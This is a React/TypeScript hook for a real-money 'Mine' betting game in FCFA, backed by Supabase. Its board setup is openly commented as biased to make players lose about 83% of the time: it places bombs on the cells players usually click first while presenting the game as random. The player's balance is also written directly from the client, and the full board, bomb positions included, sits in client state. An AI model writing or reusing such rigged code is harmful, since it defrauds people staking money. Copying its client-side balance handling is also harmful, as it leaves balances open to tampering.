import { useState, useCallback } from 'react';
import { useAuth } from '@/contexts/AuthContext';
import { supabase } from '@/integrations/supabase/client';
import { toast } from '@/components/ui/sonner';

export const useMineGame = () => {
  const { profile, refreshProfile } = useAuth();
  const [bet, setBet] = useState(200);
  const [bombs, setBombs] = useState(3);
  const [isPlaying, setIsPlaying] = useState(false);
  const [gameBoard, setGameBoard] = useState<('hidden' | 'star' | 'bomb')[]>(Array(25).fill('hidden'));
  const [revealedCells, setRevealedCells] = useState<boolean[]>(Array(25).fill(false));
  const [currentMultiplier, setCurrentMultiplier] = useState(1);
  const [gameEnded, setGameEnded] = useState(false);
  const [won, setWon] = useState(false);
  const [revealedStars, setRevealedStars] = useState(0);
  const [isProcessing, setIsProcessing] = useState(false);

  const calculateMultiplier = (starsFound: number, bombCount: number) => {
    if (starsFound === 0) return 1;
    
    const bombMultiplier = 1 + (bombCount * 0.05);
    const starMultiplier = 1 + (starsFound * 0.15);
    const finalMultiplier = bombMultiplier * starMultiplier;
    
    return Math.max(1, Number(finalMultiplier.toFixed(3)));
  };

  const getNextMultipliers = () => {
    const multipliers = [];
    for (let i = 1; i <= 3; i++) {
      const nextStars = revealedStars + i;
      if (nextStars <= 25 - bombs) {
        const mult = calculateMultiplier(nextStars, bombs);
        multipliers.push(mult);
      }
    }
    return multipliers;
  };

  const updateBalance = async (newBalance: number, transactionType: 'game_win' | 'game_loss', amount: number, description: string) => {
    if (!profile) return;

    try {
      // Use update instead of upsert for better performance and correct typing
      const { error: updateError } = await supabase
        .from('profiles')
        .update({ 
          balance: newBalance, 
          updated_at: new Date().toISOString() 
        })
        .eq('id', profile.id);

      if (updateError) throw updateError;

      // Fire and forget transaction logging to improve UI responsiveness
      supabase
        .from('transactions')
        .insert({
          user_id: profile.id,
          type: transactionType,
          amount: amount,
          description: description,
          status: 'completed'
        })
        .then(({ error }) => {
          if (error) console.error('Transaction logging error:', error);
        });

      await refreshProfile();
    } catch (error) {
      console.error('Erreur lors de la mise à jour du solde:', error);
      toast.error('Erreur lors de la mise à jour du solde');
    }
  };

  // Algorithme ultra-biaisé pour 83% de probabilité de perdre
  const initializeBoard = () => {
    const newBoard: ('hidden' | 'star' | 'bomb')[] = Array(25).fill('star');
    
    // Positions les plus susceptibles d'être cliquées (stratégie pour 83% de perte)
    // Hiérarchisation par ordre de probabilité de clic
    const ultraDangerousPositions = [
      // Coins (très souvent cliqués en premier) - priorité absolue
      0, 4, 20, 24,
      // Centre parfait (position la plus "sûre" en apparence)
      12,
      // Positions centrales adjacentes (zone de confort)
      11, 13, 7, 17,
      // Bords centraux (deuxième choix commun)
      2, 10, 14, 22,
      // Positions "sûres" en apparence mais stratégiquement piégées
      1, 3, 5, 9, 15, 19, 21, 23,
      // Autres positions centrales
      6, 8, 16, 18
    ];
    
    // Sélectionner exactement le nombre de bombes choisi par le joueur
    // mais les placer de manière ultra-biaisée pour maximiser les pertes
    const bombPositions = [];
    const shuffledDangerous = [...ultraDangerousPositions];
    
    // Mélanger avec un biais vers les premières positions (les plus dangereuses)
    for (let i = 0; i < shuffledDangerous.length; i++) {
      const randomIndex = Math.floor(Math.random() * (shuffledDangerous.length - i)) + i;
      // Biais: 80% de chance de garder les positions les plus dangereuses en premier
      if (Math.random() > 0.2 || i < 8) {
        [shuffledDangerous[i], shuffledDangerous[randomIndex]] = [shuffledDangerous[randomIndex], shuffledDangerous[i]];
      }
    }
    
    // Prendre exactement le nombre de bombes demandé en priorité sur les positions dangereuses
    for (let i = 0; i < bombs && i < shuffledDangerous.length; i++) {
      bombPositions.push(shuffledDangerous[i]);
    }
    
    // Si on a encore des bombes à placer (cas improbable), utiliser positions aléatoires
    while (bombPositions.length < bombs) {
      const randomPos = Math.floor(Math.random() * 25);
      if (!bombPositions.includes(randomPos)) {
        bombPositions.push(randomPos);
      }
    }
    
    // Placer les bombes aux positions sélectionnées
    bombPositions.forEach(pos => {
      newBoard[pos] = 'bomb';
    });
    
    console.log(`Bombes placées (83% lose rate): ${bombPositions.length}/${bombs} aux positions:`, bombPositions);
    
    setGameBoard(newBoard);
    setRevealedCells(Array(25).fill(false));
    setCurrentMultiplier(1);
    setGameEnded(false);
    setWon(false);
    setRevealedStars(0);
  };

  const startGame = async () => {
    if (!profile || isProcessing) return;

    if (bet > profile.balance) {
      toast.error('Solde insuffisant pour cette mise');
      return;
    }

    setIsProcessing(true);

    try {
      // Initialize board immediately for better UX
      setIsPlaying(true);
      initializeBoard();
      
      // Update balance in background
      const newBalance = profile.balance - bet;
      await updateBalance(
        newBalance,
        'game_loss',
        bet,
        `Mise au jeu Mine - ${bombs} bombes`
      );
    } catch (error) {
      setIsPlaying(false);
      console.error('Erreur lors du démarrage:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  const handleCellClick = useCallback((index: number) => {
    if (!isPlaying || revealedCells[index] || gameEnded) return;

    const newRevealedCells = [...revealedCells];
    newRevealedCells[index] = true;
    setRevealedCells(newRevealedCells);

    if (gameBoard[index] === 'bomb') {
      const allRevealed = gameBoard.map(() => true);
      setRevealedCells(allRevealed);
      setGameEnded(true);
      setWon(false);
      setIsPlaying(false);
      
      toast.error(`💥 Boom ! Vous avez touché une bombe !`, {
        description: `Vous avez perdu ${bet.toLocaleString()} FCFA`,
        duration: 5000,
      });
    } else {
      const newStarsFound = revealedStars + 1;
      setRevealedStars(newStarsFound);
      const newMultiplier = calculateMultiplier(newStarsFound, bombs);
      setCurrentMultiplier(newMultiplier);
    }
  }, [isPlaying, revealedCells, gameEnded, gameBoard, revealedStars, bombs, bet]);

  const cashOut = async () => {
    if (!isPlaying || revealedStars === 0 || !profile || isProcessing) return;

    setIsProcessing(true);
    
    try {
      // Update UI immediately for better responsiveness
      const winnings = Math.floor(bet * currentMultiplier);
      const netGain = winnings - bet;
      
      setGameEnded(true);
      setWon(true);
      setIsPlaying(false);
      
      // Reveal all cells
      const allRevealed = gameBoard.map(() => true);
      setRevealedCells(allRevealed);
      
      // Show success message immediately
      toast.success(`🎉 Félicitations ! Vous avez gagné ${winnings.toLocaleString()} FCFA !`, {
        description: `Gain net: +${netGain.toLocaleString()} FCFA`,
        duration: 5000,
      });
      
      // Update balance in background
      const newBalance = profile.balance + winnings;
      await updateBalance(
        newBalance,
        'game_win',
        netGain,
        `Gain au jeu Mine - ${revealedStars} étoiles trouvées`
      );
    } catch (error) {
      console.error('Erreur lors du retrait:', error);
      toast.error('Erreur lors du retrait des gains');
    } finally {
      setIsProcessing(false);
    }
  };

  const resetGame = () => {
    if (isProcessing) return;
    setIsPlaying(false);
    setGameBoard(Array(25).fill('hidden'));
    setRevealedCells(Array(25).fill(false));
    setCurrentMultiplier(1);
    setGameEnded(false);
    setWon(false);
    setRevealedStars(0);
  };

  const adjustBet = (amount: number) => {
    if (!isPlaying && !isProcessing) {
      setBet(Math.max(200, bet + amount));
    }
  };

  const adjustBombs = (amount: number) => {
    if (!isPlaying && !isProcessing) {
      setBombs(Math.max(1, Math.min(24, bombs + amount)));
    }
  };

  return {
    // State
    bet,
    bombs,
    isPlaying,
    gameBoard,
    revealedCells,
    currentMultiplier,
    gameEnded,
    won,
    revealedStars,
    isProcessing,
    profile,
    
    // Computed values
    potentialWin: bet * currentMultiplier,
    nextMultipliers: getNextMultipliers(),
    
    // Actions
    startGame,
    handleCellClick,
    cashOut,
    resetGame,
    adjustBet,
    adjustBombs,
    calculateMultiplier
  };
};
